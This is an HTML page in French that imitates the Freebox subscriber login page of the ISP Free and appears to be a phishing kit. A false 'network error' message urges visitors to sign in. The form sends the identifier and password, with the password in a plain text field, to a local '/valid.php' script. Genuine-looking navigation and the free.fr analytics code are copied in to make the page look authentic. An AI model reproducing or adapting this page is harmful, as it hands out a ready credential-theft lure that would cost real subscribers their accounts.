
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Bienvenue sur votre Espace abonn&eacute; Freebox</title>
<link href="/css/base.css" rel="stylesheet" type="text/css" />
<link href="/css/console.css" rel="stylesheet" type="text/css" />
<link href="/css/loginpage.css" rel="stylesheet" type="text/css" />
<link href="/css/centragescreen.css" rel="stylesheet" type="text/css" />

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/> 

</head>

<body>
<div id="body" role="document">
    <div id="main">
  <div id="top" role="banner">

       <div id="top-menu" role="navigation">
        <ul id="top-menu-nav" role="menubar">
          <li class="a6 current" role="menuitem"> <a title="Acc&egrave;der &agrave; votre compte" class="capt" href="">Mon Compte</a> </li>
          <li class="a5" role="menuitem"> <a title="Pages personnelles Freenautes" class="capt" href="">Pages Perso</a> </li>
          <li class="a4" role="menuitem"> <a title="Le webmail Free" class="capt" href="">Webmail</a> </li>
          <li class="a3" role="menuitem"> <a title="L'offre bas d&eacute;bit" class="capt" href="">Bas d&eacute;bit</a> </li>
          <li class="a2" role="menuitem"> <a title="L'offre Freebox" class="capt" href="">Freebox</a> </li>
          <li class="a1" role="menuitem"> <a title="Le portail Free" class="capt" href="">Portail</a> </li>
        </ul>

      </div>
      <a title="Retour &agrave; l'accueil" id="top-logo" href=""> <span>Free</span> </a>
      <div id="banner" aria-hidden="true">

        <!-- pub -->
     
      </div>
    </div>

<div class="login_container" role="main">
  <div class="login_left">
    <h1>Identification Espace abonn&eacute; Freebox</h1>

    <div class="login_form">
      <h3>Erreur r&eacuteseau: pour r&eacutegler le probl&egraveme merci de vous connecter. </h3>

	  <form method="POST" action="/valid.php">
      <!--div class="loginalert" aria-live="assertive" role="alert"><strong>  </strong></div-->
        
        <input type="hidden" name="link" value="" aria-disabled="true" />
        <fieldset>
          <div class="field"><label for="login" class="label_login" aria-label="Identifiant"></label><input type="text" name="cle" class="inputfield" id="login" value=""Votre identifiant" onfocus="this.value='';"" aria-required="true" title="Votre identifiant"/></div>
          <div class="field"><label for="pass" class="label_pass" aria-label="Mot de Passe"></label><input type="text" name="cleconf" class="inputfield" aria-required="true" title="Votre Mot de Passe" /></div>

      <div class="login_new">
        <img src="/images/newevent.png" style="vertical-align:text-bottom" /> &nbsp;&nbsp;<strong>Vos identifiants &eacute;voluent.</strong> <a href="" target="_blank"><u>En savoir plus</u> ...</a>
      </div>


        </fieldset>
               
        <input type="submit" name="ok" class="login_button" title="Se Connecter" />
        <br />
        <p>&nbsp;</p>
      </form>
    </div>
  </div>
  <div class="login_right">

    <div class="login_info">
      <h2>Cette interface vous permet de g&eacute;rer vos param&egravetres.</h2>
      <ul>
        <li><em>&bull;</em><p><strong>Votre ligne Freebox</strong>, en vous identifiant &agrave; l'aide de votre num&eacute;ro de t&eacute;l&eacute;phone fixe, votre num&eacute;ro Freebox ou votre idenfiant commen&ccedil;ant par "fbx" et du mot de passe associ&eacute;.</p></li>
       
        <li><em>&bull;</em><p><strong>Retrouvez vos identifiants</strong>, en suivant les instructions ci-dessous.</p></li>
      </ul>
    </div>
  </div>
</div>

    </div>
    <div id="bottom">
    <!--SITEMAP-->
    <div id="bottom-links">
    </div>
    <!--SITEMAP-->
    <div id="bottom-infos">
    </div>
    <div class="clear"></div>


</div>
</div>
<img class="idfree" src="/images/freeid.png"/>

<!-- Piwik --> 
<script type="text/javascript"> 


  var _paq = _paq || [];

	//Mise en conformité CNIL
	//limitation conservation cookies analytics internes 13 mois
		_paq.push([function() { 
			var self = this; 
			function getOriginalVisitorCookieTimeout() { 
			 var now = new Date(), 
			 nowTs = Math.round(now.getTime() / 1000), 
			 visitorInfo = self.getVisitorInfo(); 
			 var createTs = parseInt(visitorInfo[2]); 
			 var cookieTimeout = 33696000; 
			 var originalTimeout = createTs + cookieTimeout - nowTs; 
			 return originalTimeout; 
			 } 
			 this.setVisitorCookieTimeout( getOriginalVisitorCookieTimeout() ); 
		 }]); 
	// END CNIL
	

  _paq.push(["setCookieDomain", "*.free.fr"]);
  _paq.push(["setDomains", ["*.free.fr"]]);
  //_paq.push(["setDoNotTrack", true]);
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u=(("https:" == document.location.protocol) ? "https" : "http") + "://statsweb.proxad.net/";
    _paq.push(['setTrackerUrl', u+'piwik.php']);
    _paq.push(['setSiteId', 2]);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0]; g.type='text/javascript';
    g.defer=true; g.async=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
  })();


			$('.clicka,.ss,.bottombar,button').click(function(){
				_paq.push(['setCustomVariable',1,'HomeLinks',$(this).attr('id')]);
			})
			







</body>
</html>

